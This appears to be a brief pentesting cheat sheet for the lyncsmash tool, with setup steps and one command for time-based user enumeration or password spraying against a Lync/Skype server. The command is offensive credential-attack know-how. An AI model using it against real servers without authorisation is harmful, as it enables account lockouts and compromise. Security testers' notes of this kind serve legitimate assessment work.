### source
https://github.com/nyxgeek/lyncsmash  

### prepare python2 virtual environment
```
virtualenv -p /usr/bin/python2.7 lyncsmash && source lyncsmash/bin/activate && pip install requests
```

### time based user enumeration or password spray
```
./lyncsmash.py enum -U <userFile> -p "<password>" -d <domainIntern> -H <rhost>
```
